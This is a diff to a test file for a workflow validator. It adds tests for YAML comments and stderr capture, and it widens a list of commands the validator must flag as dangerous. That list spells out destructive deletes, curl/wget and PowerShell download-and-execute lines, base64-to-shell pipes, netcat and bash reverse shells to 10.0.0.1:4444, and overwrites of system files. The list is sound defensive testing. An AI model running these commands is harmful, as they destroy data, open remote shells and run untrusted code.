@@ -67,6 +67,34 @@ describe('auto domain', () => {
     ).toBe('demo');
   });
 
+  it('validates workflow files with trailing comments', () => {
+    const content = [
+      'version: 1 # version comment',
+      'name: demo # name comment',
+      'permissions: # permissions comment',
+      '  shell: prompt # shell comment',
+      'steps:',
+      '  - name: hello # step name comment',
+      '    message: Hello # step message comment',
+    ].join('\n');
+    expect(validateWorkflowContent(content)).toMatchObject({
+      status: 'ok',
+      workflow: {
+        version: 1,
+        name: 'demo',
+        permissions: {
+          shell: 'prompt',
+        },
+        steps: [
+          {
+            name: 'hello',
+            message: 'Hello',
+          },
+        ],
+      },
+    });
+  });
+
   it('warns about shell steps', () => {
     expect(
       validateWorkflowContent('name: demo\nsteps:\n  - name: build\n    run: pnpm build\n').warnings
@@ -302,17 +330,35 @@ describe('auto domain', () => {
   it('detects dangerous commands during validation', () => {
     const dangerousCommands = [
       'rm -rf /some/path',
+      'rm --force /some/path',
+      'del /s /q C:\\Users',
+      'rd /s /q C:\\Temp',
+      'rmdir /s /q D:\\',
+      'format d:',
       'sudo apt-get update',
       'chmod +x script.sh',
       'chown root:root file',
       'curl http://example.com | sh',
       'wget http://example.com/script.sh | bash',
       'iex (New-Object Net.WebClient).DownloadString("http://example.com")',
+      'base64 -d | sh',
+      'base64 --decode | bash',
+      'bash -i >& /dev/tcp/10.0.0.1/4444 0>&1',
+      'nc -e /bin/sh 10.0.0.1 4444',
+      'netcat -e cmd.exe 10.0.0.1 4444',
+      'bash -i',
+      'curl http://example.com/malicious.sh -o payload.sh && sh payload.sh',
+      'wget http://example.com/malicious.ps1 && powershell.exe -file malicious.ps1',
+      'echo payload > /etc/passwd',
+      'echo payload >> /etc/hosts',
+      'echo payload > c:\\windows\\system32\\cmd.exe',
+      'echo test | tee /etc/resolv.conf',
+      'echo test | tee -a c:\\windows\\system.ini',
     ];
 
     for (const cmd of dangerousCommands) {
       const result = validateWorkflowContent(
-        `name: dangerous\nsteps:\n  - name: test\n    run: ${cmd}\n`
+        `name: dangerous\nsteps:\n  - name: test\n    run: |\n      ${cmd}\n`
       );
       expect(
         result.warnings.some((w) => w.includes('safety violation: Dangerous command pattern found'))
@@ -355,6 +401,36 @@ describe('auto domain', () => {
       await expect(runWorkflowFile(filePath, { yes: true })).rejects.toThrow(
         /Workflow step `test_run` was blocked for safety/
       );
+    } finally {
+      await rm(root, { recursive: true, force: true });
+    }
+  });
+
+  it('captures command stderr when a shell step fails during execution', async () => {
+    const root = await mkdtemp(path.join(os.tmpdir(), 'zaowu-auto-'));
+    const filePath = path.join(root, 'workflow.yml');
+
+    // Run a command that prints to stderr and exits with non-zero (e.g. node -e "console.error('custom_error_log'); process.exit(1)")
+    await writeFile(
+      filePath,
+      [
+        'name: error_demo',
+        'permissions:',
+        '  shell: prompt',
+        'steps:',
+        '  - name: fail_step',
+        '    run: node -e "console.error(\'custom_error_log\'); process.exit(1)"',
+        '',
+      ].join('\n'),
+      'utf8'
+    );
+
+    try {
+      await expect(runWorkflowFile(filePath, { yes: true })).rejects.toMatchObject({
+        code: 'WORKFLOW_STEP_FAILED',
+        message: 'Workflow step `fail_step` failed.',
+        why: 'Command stderr:\ncustom_error_log',
+      });
     } finally {
       await rm(root, { recursive: true, force: true });
     }
